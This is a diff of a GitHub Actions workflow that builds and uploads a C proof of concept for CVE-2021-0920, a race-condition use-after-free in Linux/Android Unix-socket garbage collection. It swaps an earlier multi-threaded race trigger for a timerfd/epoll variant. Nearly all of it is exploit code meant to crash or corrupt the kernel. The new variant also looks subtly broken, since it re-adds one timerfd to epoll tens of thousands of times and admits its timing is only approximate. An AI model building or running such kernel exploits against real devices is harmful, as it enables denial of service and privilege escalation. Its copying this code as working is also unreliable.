@@ -1,4 +1,4 @@
-name: build_cve_2021_0920_poc
+name: build_cve_2021_0920_poc_v3_timerfd
 on: [push, workflow_dispatch]
 
 jobs:
@@ -14,7 +14,7 @@ jobs:
           ndk-version: r27c
           add-to-path: true
 
-      - name: Write PoC source
+      - name: Write PoC source with timerfd
         run: |
           cat << 'EOF' > poc.c
           #define _GNU_SOURCE
@@ -24,25 +24,20 @@ jobs:
           #include <stdio.h>
           #include <stdlib.h>
           #include <string.h>
-          #include <sys/mman.h>
-          #include <sys/resource.h>
+          #include <sys/epoll.h>
           #include <sys/socket.h>
-          #include <sys/time.h>
+          #include <sys/timerfd.h>
           #include <sys/types.h>
-          #include <sys/wait.h>
           #include <time.h>
           #include <unistd.h>
 
           #define __int64 long
           #define __int8 char
+          #define EPOLL_COUNT 50000
 
           int sv[2];
-          pthread_mutex_t condition_mutex_recvmsg;
-          pthread_mutex_t condition_mutex_recv;
-          int g_victim_sock_fd;
-          pthread_mutex_t condition_mutex_gc;
-          pthread_cond_t condition_cond_gc;
-          pthread_cond_t condition_cond_recvmsg;
+          int epfd;
+          int tfd;
 
           static void send_fd(int socket, int fd) {
               struct msghdr msg = {0};
@@ -59,53 +54,26 @@ jobs:
               cmsg->cmsg_len = CMSG_LEN(sizeof(fd));
               *((int *)CMSG_DATA(cmsg)) = fd;
               msg.msg_controllen = CMSG_SPACE(sizeof(fd));
-              if (sendmsg(socket, &msg, 0) < 0)
-                  perror("Failed to send message send_fd");
+              sendmsg(socket, &msg, 0);
           }
 
-          __int64 pin_cpu(int core_id) {
-              cpu_set_t mask;
-              CPU_ZERO(&mask);
-              CPU_SET(core_id, &mask);
-              return sched_setaffinity(0, sizeof(mask), &mask);
-          }
-
-          void t_main_gc_simple(__int64 a1, __int64 a2) {
-              int v3;
-              int fd;
-              setpriority(PRIO_PROCESS, 0, -19);
-              pin_cpu(3LL);
-              pthread_mutex_lock(&condition_mutex_gc);
-              pthread_cond_wait(&condition_cond_gc, &condition_mutex_gc);
-              pthread_mutex_unlock(&condition_mutex_gc);
-              fd = socket(1, 1, 0);
-              v3 = socket(1, 1, 0);
-              setpriority(PRIO_PROCESS, 0, -18);
-              close(fd);
-              pthread_cond_signal(&condition_cond_recvmsg);
-              close(v3);
-              usleep(0x186A0u);
-          }
-
-          int fd_34[2];
-          int local_spair[2];
-
-          __int64 setup_race(int a1) {
+          // Thread that sets up the race and triggers timerfd
+          void *setup_race(void *arg) {
               int v5[710];
-              setpriority(PRIO_PROCESS, 0, 19);
               int fd = socket(1, 1, 0);
               close(fd);
               usleep(0x61A80u);
-              socketpair(1, 1, 0, fd_34);
-              send_fd(sv[0], fd_34[1]);
-              send_fd(fd_34[0], fd_34[0]);
+              socketpair(1, 1, 0, sv);
+              send_fd(sv[0], sv[1]);
+              send_fd(sv[1], sv[0]);
+
               for (int i = 0; i <= 99; ++i) {
                   socketpair(1, 1, 0, &v5[2 * i + 510]);
                   for (int k = 0; k <= 4; ++k)
                       v5[5 * i + 10 + k] = socket(1, 1, 0);
               }
               for (int i = 0; i <= 99; ++i) {
-                  send_fd(fd_34[1], v5[2 * i + 511]);
+                  send_fd(sv[0], v5[2 * i + 511]);
                   for (int k = 0; k <= 4; ++k) {
                       send_fd(v5[2 * i + 510], v5[5 * i + 10 + k]);
                       close(v5[5 * i + 10 + k]);
@@ -113,72 +81,40 @@ jobs:
                   close(v5[2 * i + 511]);
                   close(v5[2 * i + 510]);
               }
-              close(fd_34[1]);
-              close(fd_34[0]);
-              usleep(0x186A0u);
-              pthread_cond_signal(&condition_cond_gc);
-              usleep(0x186A0u);
               close(sv[0]);
-              return 0;
-          }
-
-          __int64 t_recvmsg() {
-              char v9 = 0;
-              long v10[130];
-              struct msghdr v11;
-              long received_fds[10];
-              int v14, v16, v17;
-              setpriority(PRIO_PROCESS, 0, 20);
-              memset(&v11, 0, sizeof(v11));
-              v10[0] = (long)&v9;
-              v10[1] = 1LL;
-              v11.msg_iov = (struct iovec *)&v10;
-              v11.msg_iovlen = 1LL;
-              v11.msg_control = received_fds;
-              v11.msg_controllen = 20LL;
-              int *received_fds_ptr = (int *)received_fds;
-              received_fds[0] = 20LL;
-              pin_cpu(2LL);
-              setpriority(PRIO_PROCESS, 0, -19);
-              pthread_mutex_lock(&condition_mutex_recvmsg);
-              pthread_cond_wait(&condition_cond_recvmsg, &condition_mutex_recvmsg);
-              pthread_mutex_unlock(&condition_mutex_recvmsg);
-              usleep(0xFAu);
-              recvmsg(sv[1], &v11, 0x80042);
-              int fd = received_fds_ptr[4];
-              recvmsg(fd, &v11, 0x80042);
-              g_victim_sock_fd = received_fds_ptr[4];
-              usleep(0x3E8u);
-              v16 = -1;
-              recvmsg(fd, &v11, 0x80040);
-              v16 = received_fds_ptr[4];
-              usleep(0x186A0u);
-              close(fd);
-              close(v16);
               close(sv[1]);
-              pthread_exit(0LL);
-              return 0LL;
+              // After setup, trigger the timerfd to fire in the race window
+              // (In a real exploit, this would be timed precisely)
+              struct itimerspec its = { .it_value = { .tv_nsec = 1 } };
+              timerfd_settime(tfd, 0, &its, NULL);
+              return NULL;
           }
 
-          void trigger() {
-              pthread_t v18, v20, v21;
-              pthread_create(&v20, 0LL, (void *(*)(void *))t_main_gc_simple, 0LL);
-              pthread_create(&v18, 0LL, (void *(*)(void *))t_recvmsg, 0LL);
-              usleep(0x2710u);
-              pthread_create(&v21, 0LL, (void *(*)(void *))setup_race, 0LL);
-              pthread_join(v21, 0LL);
-              pthread_join(v18, 0LL);
-              pthread_join(v20, 0LL);
-              usleep(10);
-              puts("wut?");
-          }
+          int main() {
+              // Create timerfd
+              tfd = timerfd_create(CLOCK_MONOTONIC, 0);
+              if (tfd < 0) { perror("timerfd_create"); return 1; }
 
-          int main(int argc, char **argv) {
-              for (int i = 0; i < 20; i++) {
-                  if (socketpair(1, 1, 0, sv) != 0)
-                      printf("Failed to create Unix-domain socket pair\n");
-                  trigger();
+              // Create epoll with many waiters
+              epfd = epoll_create1(0);
+              if (epfd < 0) { perror("epoll_create1"); return 1; }
+              struct epoll_event ev = { .events = EPOLLIN };
+              for (int i = 0; i < EPOLL_COUNT; i++) {
+                  if (epoll_ctl(epfd, EPOLL_CTL_ADD, tfd, &ev) < 0) {
+                      // Some kernels limit epoll count, ignore errors
+                  }
               }
+
+              // Run the race setup in a separate thread
+              pthread_t th;
+              for (int i = 0; i < 100; i++) {
+                  if (socketpair(1, 1, 0, sv) != 0) continue;
+                  pthread_create(&th, NULL, setup_race, NULL);
+                  pthread_join(th, NULL);
+                  // Check if we survived (if UAF happened, kernel may panic)
+                  usleep(1000);
+              }
+              printf("PoC finished without crash (race may not have hit)\n");
               return 0;
           }
           EOF
@@ -194,5 +130,5 @@ jobs:
 
       - uses: actions/upload-artifact@v4
         with:
-          name: cve-2021-0920-poc
+          name: cve-2021-0920-poc-v3
           path: poc
